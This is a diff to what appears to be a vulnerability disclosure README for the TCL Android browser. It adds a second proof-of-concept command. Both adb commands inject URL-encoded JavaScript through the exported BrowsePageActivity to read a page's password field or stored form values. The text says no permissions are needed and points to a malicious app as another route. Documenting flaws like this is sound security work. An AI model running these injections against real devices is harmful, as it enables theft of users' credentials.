@@ -35,7 +35,7 @@ This vulnerability is particularly concerning because:
 
 ![image](https://github.com/actuator/com.tcl.browser/blob/main/poc.gif)
 
-This ADB command injects JavaScript to extract password data & can be  accomplished without ADB with no permissions.
+These ADB commands inject JavaScript to extract password data & can be accomplished without ADB with no permissions.
 
 ```bash
 adb shell am start -a android.intent.action.VIEW -d 'javascript:(function()%7Bvar%20password%20%3D%20document.getElementById(%27pass%27).value%3Balert(%27Password%3A%20%27%20%2B%20password)%3B%7D)()' com.tcl.browser/com.tcl.browser.portal.browse.activity.BrowsePageActivity
@@ -44,8 +44,14 @@ adb shell am start -a android.intent.action.VIEW -d 'javascript:(function()%7Bva
 ![image](https://github.com/actuator/com.tcl.browser/blob/main/Facebook.gif)
 
 
-
 ![poc](https://github.com/actuator/com.tcl.browser/assets/78701239/15b32aff-92ac-41f2-9d48-4ae5a04ce354)
+
+```
+adb shell am start -a android.intent.action.VIEW -d 'javascript:(function()%7Bvar%20initialValue%20%3D%20document.querySelector(%27input[data-initial-value]%27).getAttribute(%27data-initial-value%27)%3Balert(%27Initial%20Data%20Value%3A%20%27%20%2B%20initialValue)%3B%7D)()' com.tcl.browser/com.tcl.browser.portal.browse.activity.BrowsePageActivity
+```
+
+![image](https://github.com/actuator/com.tcl.browser/blob/main/Gmail.gif)
+
 
 To demonstrate the vulnerability, one can create a simple Android app that invokes the exported `BrowsePageActivity` activity:
 
